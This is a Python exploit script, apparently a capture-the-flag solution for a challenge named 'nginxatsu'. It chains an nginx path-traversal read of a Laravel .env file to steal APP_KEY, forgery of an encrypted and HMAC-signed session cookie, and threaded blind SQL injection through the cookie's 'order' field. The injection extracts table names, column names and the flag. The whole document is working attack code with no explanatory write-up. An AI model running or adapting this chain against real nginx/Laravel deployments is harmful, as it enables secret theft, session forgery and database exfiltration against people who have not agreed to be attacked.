"""
Coded by d4rkstat1c
"""
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64decode, b64encode
import requests
import json
import time
import phpserialize
import hmac
import hashlib
from string import printable
from urllib import parse
import re
from threading import Thread
from time import sleep

BASE_URL = 'http://<nginxatsu_ip>:<port>/'
MAX_THRDS = 15

class Aes:
	def __init__(self, key):
		self.key = key
		self.iv = None

	def encrypt(self, pt, iv):
		cipher = AES.new(self.key, AES.MODE_CBC, iv)
		return cipher.encrypt(pad(pt, 16))

	def decrypt(self, ct, iv):
		cipher = AES.new(self.key, AES.MODE_CBC, iv)
		return unpad(cipher.decrypt(ct), 16)

class cookie_bsqli:
	def __init__(self):
		self.session = requests.session()
		self.aes = Aes(self.__get_key(self.session))
		self.cookie_dict, self.cookie_id = self.__decode_cookie()
		self.deserialized_data = self.__decrypt_value()
		self.exfil_data = {}

	@staticmethod
	def __get_key(session):
		session.get(BASE_URL)
		env_data = session.get(BASE_URL+'assets../.env').text
		key_pattern = 'APP_KEY=base64:'
		app_key_start = env_data.find(key_pattern)+len(key_pattern)
		key_str = env_data[app_key_start:app_key_start+44]
		return b64decode(key_str)

	@staticmethod
	def __get_cookie(cookies, cookie_str):
		for cookie in cookies:
			if cookie_str not in cookie:
				return cookie

	def __decode_cookie(self):
		"""
		First extract target cookie ID/name and corresponding values and parse the json data of the target cookie
		"""
		cookies = self.session.cookies.items()
		cookie_id, encoded_data = self.__get_cookie(cookies, 'nginxatsu_session')
		cookie_json = b64decode(parse.unquote(encoded_data))
		cookie_dict = json.loads(cookie_json)
		return cookie_dict, cookie_id

	def __decrypt_value(self):
		"""
		Next we decode the target cookie's json "value" and "iv" base64 encoded strings
		"""
		encrypted_val = b64decode(self.cookie_dict['value'])
		self.aes.iv = b64decode(self.cookie_dict['iv'])

		"""
		Next we decrypt the encrypted "value" raw bytes and parse the json "value" data into a dictionary
		"""
		json_val = self.aes.decrypt(encrypted_val, self.aes.iv)
		value_data = json.loads(json_val)

		return phpserialize.loads(value_data['data'].encode())

	def __send_payload(self, payload_fstr, pos, ch):
		"""
		Now we extract the 'data' php serialize()'d string from the decrypted json "value" data
		"""

		"""
		We now have the target cookie data that we can inject with our constructed BLIND-SQLI payload
		"""
		payload = payload_fstr.format(pos=pos, ch=ch)
		self.deserialized_data[b'order'] = payload
		
		"""
		Next we re-serialized the cookie containing the payload and user and json encode it
		"""
		serialized_data = phpserialize.dumps(self.deserialized_data)
		new_data = {'data':serialized_data.decode(), 'expires':int(time.time()+60*60)}
		json_nval = json.dumps(new_data).encode()

		"""
		Encrypt the injected data object contained in the target cookie
		"""
		encrypted_nval = self.aes.encrypt(json_nval, self.aes.iv)
		b64_encrypted_nval = b64encode(encrypted_nval).decode()

		"""
		Modify the original cookie_dict extracted from the first step to contain the injected value payload and newly generated hmac
		"""
		self.cookie_dict['value'] = b64_encrypted_nval
		self.cookie_dict['mac'] = hmac.new(self.aes.key, (self.cookie_dict['iv']+self.cookie_dict['value']).encode(), hashlib.sha256).hexdigest()

		"""
		Convert cookie_dict to json then base64 and url encode it
		"""
		cookie_payload = json.dumps(self.cookie_dict).encode()
		b64_cookie_payload = b64encode(cookie_payload).decode()

		"""
		Now set the current session cookie's to our injected cookie + nginxatsu_session
		"""
		self.session.cookies.set(self.cookie_id, b64_cookie_payload, domain=re.split("//|:", BASE_URL)[2])
		r = self.session.get(BASE_URL+'api/configs/')
		if r.status_code == 200 and ch:
			if type(ch) == int:
				found_ch = chr(ch)
			else:
				found_ch = ch
			self.exfil_data[pos] = found_ch
			print("Char found:", found_ch, "At index:", pos)
			return True
		else:
			return False

	def __sort_data(self):
		data = dict(sorted(self.exfil_data.items())).values()
		self.exfil_data = {}
		return ''.join(list(data))

	def inject(self, payload_fstr, brute_sz, ascii_hex=False):
		thrds = []
		if ascii_hex:
			ascii_chars = [num for num in range(32, (128))]
		else:
			ascii_chars = printable[:-6]
		for pos in range(1, brute_sz+1):
			for ch in ascii_chars:
				t = Thread(target=self.__send_payload, args=(payload_fstr, pos, ch))
				t.daemon = True
				t.start()
				thrds.append(t)
				while len(thrds) == MAX_THRDS:
					sleep(0.005)
					for thrd in thrds:
						if not thrd.is_alive():
							thrds.remove(thrd)
				if pos in self.exfil_data.keys():
					break

		for thrd in thrds:
			while (thrd.is_alive()):
				sleep(0.5)
		return self.__sort_data()

# target db = 'nginxatsu'
# target table = 'definitely_not_a_flaaag'
# target column = 'flag_xxxxx' row = '<flag>'
def main():
	s = cookie_bsqli()
	table_payload = "id->\"')), (SELECT (CASE WHEN (SELECT SUBSTRING(table_name,{pos},1) FROM information_schema.tables WHERE table_name LIKE '%fl%' LIMIT 1) = '{ch}' THEN 'SUCCESS' ELSE (select exp(~(SELECT * FROM (select user())x))) END)) #"
	flag_table = s.inject(table_payload, 23)
	print('[*] table exfiltrated:', flag_table)

	column_payload = "id->\"')), (SELECT (CASE WHEN (SELECT SUBSTRING(column_name,{pos},1) FROM information_schema.columns WHERE table_name = '"+flag_table+"' AND column_name LIKE '%flag%' LIMIT 1) = '{ch}' THEN 'SUCCESS' ELSE (select exp(~(SELECT * FROM (select user())x))) END)) #"
	flag_column = s.inject(column_payload, 10)
	print('[*] column exfiltrated:', flag_column)

	flag_payload = "id->\"')), (SELECT (CASE WHEN (SELECT ASCII(SUBSTRING("+flag_column+",{pos},1)) FROM nginxatsu."+flag_table+") = {ch} THEN 'SUCCESS' ELSE (select exp(~(SELECT * FROM (select user())x))) END)) #"
	ctf_flag = s.inject(flag_payload, 32, True)
	print('[*] flag exfiltrated:', ctf_flag)

if __name__ == '__main__':
	main()
